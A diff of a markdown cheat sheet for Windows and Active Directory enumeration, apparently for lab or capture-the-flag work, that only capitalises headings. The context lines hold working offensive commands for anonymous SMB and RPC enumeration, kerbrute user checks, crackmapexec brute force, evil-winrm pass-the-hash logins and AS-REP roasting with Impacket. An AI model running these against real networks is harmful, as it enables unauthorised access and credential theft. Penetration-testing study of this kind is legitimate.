@@ -3,7 +3,7 @@ Windows Enum Cheatsheet
 ----------------------
 (work in progress)
 
-## enum users
+## Enum users
 ```
 rpcclient -U '' 10.10.1.2
 enumdomusers	# search for users
@@ -16,7 +16,7 @@ Get only usernames from enumdomusers:
 cat file | awk -F\[ '{print $2}' | awk -F\] '{print $1}' > users.txt
 ```
 
-## enum shares
+## Enum shares
 With the latsest version of crackmapexec use 'cme' instead of 'crackmapexec'
 ```
 crackmapexec smb 10.10.1.2 --shares
@@ -29,13 +29,13 @@ smbclient -U '' -L 10.10.1.2
 smbmap -H 10.10.1.2 -u '' -p ''
 ```
 
-## check valid users
+## Check valid users
 https://github.com/ropnop/kerbrute
 ```
 ./kerbrute userenum --dc 10.10.1.2 --d domainname.local users.txt 
 ```
 
-## brute force
+## Brute force
 With the latsest version of crackmapexec use 'cme' instead of 'crackmapexec'
 Get the password policy:
 ```
@@ -51,13 +51,13 @@ cme smb 10.10.10.182 -u username -p password -M spider_plus
 ```
 This crawls through every share we have access to and returns it in json.
 
-## mount
+## Mount
 ```
 mkdir /mnt/data
 mount -t cifs -o 'user=username,password=password' //10.10.1.2/sharename /mnt/sharename
 ```
 
-## ldap
+## lDAP
 ```
 ldapsearch -x -h 10.10.1.2 -s base namingcontexts
 ```
@@ -76,7 +76,7 @@ cat ldapdump | awk '{print s$1}' | sort | uniq -c| sort -nr | grep :
 ```
 If you find anything interesting search for it in the dump
 
-## gaining access
+## Gaining access
 Check
 With the latsest version of crackmapexec use 'cme' instead of 'crackmapexec'
 ```
@@ -89,7 +89,7 @@ ruby evil-winrm.rb -i 10.10.1.2 -u username -p password
 ruby evil-winrm.rb -i 10.10.1.2 -u username -H ntlmhash
 
 ```
-## impacket
+## Impacket
 ### GetNPUsers.py
 Queries target domain for users with 'Do not require Kerberos pre auth' set and export the TGTs for cracking
 ```
